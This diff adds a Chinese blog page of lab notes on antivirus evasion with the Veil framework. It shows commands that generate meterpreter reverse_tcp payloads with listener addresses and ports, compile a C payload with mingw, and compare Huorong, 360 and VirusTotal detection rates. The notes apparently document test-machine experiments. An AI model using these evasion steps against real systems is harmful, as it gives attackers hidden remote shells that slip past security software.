@@ -1,0 +1,200 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>免杀实验笔记之Veil - Sec H</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="渗透测试,"> 
+    <meta name="description" content="Veil启动12345docker ps -adocker exec -it [docker镜像地址] &amp;#x2F;bin&amp;#x2F;bashveil
+
+Veil使用Veil有两个免杀工具，Evas,"> 
+    <meta name="author" content="Sec H"> 
+    <link rel="alternative" href="atom.xml" title="Sec H" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Sec H</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://givemefivw.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">免杀实验笔记之Veil</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">免杀实验笔记之Veil</h1>
+        <div class="stuff">
+            <span>十二月 23, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" rel="tag">免杀实验笔记</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Veil启动"><a href="#Veil启动" class="headerlink" title="Veil启动"></a>Veil启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">docker exec -it [docker镜像地址] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">veil</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/1.png"></p>
+<h2 id="Veil使用"><a href="#Veil使用" class="headerlink" title="Veil使用"></a>Veil使用</h2><p>Veil有两个免杀工具，Evasion和Ordnance</p>
+<p>Ordnance可生成再Veil-Evasion中使用的Shellcode，Evasion用作文件免杀，一般选用Evasion</p>
+<p>go &amp; ruby语言encode的编码方式效果较好</p>
+<h2 id="直接生成exe免杀"><a href="#直接生成exe免杀" class="headerlink" title="直接生成exe免杀"></a>直接生成exe免杀</h2><p>选择Evasion&gt;use 16<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/2.png"><br>设置监听地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 2244</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好output的名字即可<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/3.png"></p>
+<p>在/tmp/veil-output/compiled/目录可直接找到生成的payload文件<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/4.png"></p>
+<p>在测试机中上线测试，正常上线<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/5.png"><br>但是被火绒查杀到<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/6.png"></p>
+<h2 id="VT查杀率-47-71"><a href="#VT查杀率-47-71" class="headerlink" title="VT查杀率(47/71)"></a>VT查杀率(47/71)</h2><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/7.png"></p>
+<h2 id="Veil结合Mingw免杀"><a href="#Veil结合Mingw免杀" class="headerlink" title="Veil结合Mingw免杀"></a>Veil结合Mingw免杀</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 4466</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>生成c的payload<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/8.png"></p>
+<p>然后用mingw编译c文件到exe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o veil_c_test.exe veil_c_test.c -l ws2_32</span><br></pre></td></tr></table></figure>
+<p>可被火绒查杀到</p>
+<p>msf监听，出现假session<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/10.png"></p>
+<p>VT查杀率(3/71)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/9.png"></p>
+<h2 id="Veil使用ruby-meterpreter-reverse-tcp-py"><a href="#Veil使用ruby-meterpreter-reverse-tcp-py" class="headerlink" title="Veil使用ruby/meterpreter/reverse_tcp.py"></a>Veil使用ruby/meterpreter/reverse_tcp.py</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.135</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 8899</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好输出文件的名字，在输出文件夹即可找到生成的payload<br>上传到测试机<br>不幸的是，火绒和360杀毒都能检测到<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/11.png"><br>在火绒和360管家开启的状态下，无法正常上线，关闭则可以<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/12.png"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Veil%E5%90%AF%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">Veil启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Veil%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Veil使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90exe%E5%85%8D%E6%9D%80"><span class="toc-number">3.</span> <span class="toc-text">直接生成exe免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VT%E6%9F%A5%E6%9D%80%E7%8E%87-47-71"><span class="toc-number">4.</span> <span class="toc-text">VT查杀率(47&#x2F;71)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Veil%E7%BB%93%E5%90%88Mingw%E5%85%8D%E6%9D%80"><span class="toc-number">5.</span> <span class="toc-text">Veil结合Mingw免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Veil%E4%BD%BF%E7%94%A8ruby-meterpreter-reverse-tcp-py"><span class="toc-number">6.</span> <span class="toc-text">Veil使用ruby&#x2F;meterpreter&#x2F;reverse_tcp.py</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
